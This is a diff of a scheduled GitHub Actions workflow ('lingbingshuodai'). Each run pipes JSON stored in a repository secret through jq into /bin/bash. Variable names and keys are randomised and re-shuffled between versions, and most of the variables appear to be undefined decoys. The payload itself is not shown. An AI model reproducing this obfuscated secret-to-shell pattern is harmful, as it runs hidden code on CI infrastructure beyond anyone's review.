@@ -3,9 +3,8 @@ name: lingbingshuodai
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
-
-jobs:  # 11136
+    - cron: '28 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,24 +12,17 @@ jobs:  # 11136
       - uses: actions/checkout@v4
       - name: lingbingshuodai
         env:
-          z084: ${{ secrets.z084 }}
+          vuk475: ${{ secrets.vuk475 }}
         run: |
-          echo $z084 | jq -r .u302 | /bin/bash
-          echo $xwy54 | jq -r .b61254 | /bin/bash
-          echo $ya4 | jq -r .tyzu17 | /bin/bash
-          echo $t97 | jq -r .ip467 | /bin/bash
-          echo $lzvx94679 | jq -r .g98159 | /bin/bash
-          echo $ec1905 | jq -r .yz87 | /bin/bash
-          echo $uz20 | jq -r .ucyj2827 | /bin/bash
-          echo $mtow66 | jq -r .yghtl5228 | /bin/bash
-          echo $qw23 | jq -r .jns5 | /bin/bash
-          echo $xwobl9110 | jq -r .bwpxh44437 | /bin/bash
-          echo $xh73 | jq -r .xpa36 | /bin/bash
-          echo $oxfp670 | jq -r .ooa50 | /bin/bash
-          echo $i204 | jq -r .lgu88 | /bin/bash
-          echo $k97290 | jq -r .uevax01840 | /bin/bash
-          echo $o573 | jq -r .zjqy1 | /bin/bash
-          echo $u003 | jq -r .sris4 | /bin/bash
-          echo $jmj153 | jq -r .uymx6463 | /bin/bash
-          echo $djk2 | jq -r .tpp36 | /bin/bash
+          echo $vuk475 | jq -r .onhm298 | /bin/bash
+          echo $nt89134 | jq -r .ly79 | /bin/bash
+          echo $teii49932 | jq -r .ozixn31 | /bin/bash
+          echo $sc835 | jq -r .m9266 | /bin/bash
+          echo $qnhuy73 | jq -r .ssplu0 | /bin/bash
+          echo $qqrgv1 | jq -r .lhuc9372 | /bin/bash
+          echo $u72 | jq -r .b626 | /bin/bash
+          echo $yauia2636 | jq -r .gvcg020 | /bin/bash
+          echo $f6 | jq -r .ir85238 | /bin/bash
+          echo $qxdsx8 | jq -r .x50839 | /bin/bash
+          echo $ws62 | jq -r .ks867 | /bin/bash
 
